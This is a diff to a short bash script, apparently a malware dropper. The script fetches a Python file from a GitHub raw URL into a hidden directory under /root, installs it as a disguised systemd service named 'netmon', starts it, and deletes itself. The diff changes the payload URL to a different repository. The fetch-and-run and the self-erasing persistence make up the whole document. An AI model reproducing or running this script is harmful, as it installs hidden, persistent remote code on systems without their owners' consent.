@@ -1,5 +1,5 @@
 #!/bin/bash
-URL="https://raw.githubusercontent.com/t56r4re/34553/main/gd.py"
+URL="https://raw.githubusercontent.com/mimikr00t/superecon/refs/heads/main/modules/core.py"
 DIR="/root/.netmon"
 FILE="$DIR/gd.py"
 SERVICE="/etc/systemd/system/netmon.service"
@@ -28,3 +28,4 @@ systemctl enable netmon.service
 systemctl start netmon.service
 
 rm -- "$0"
+
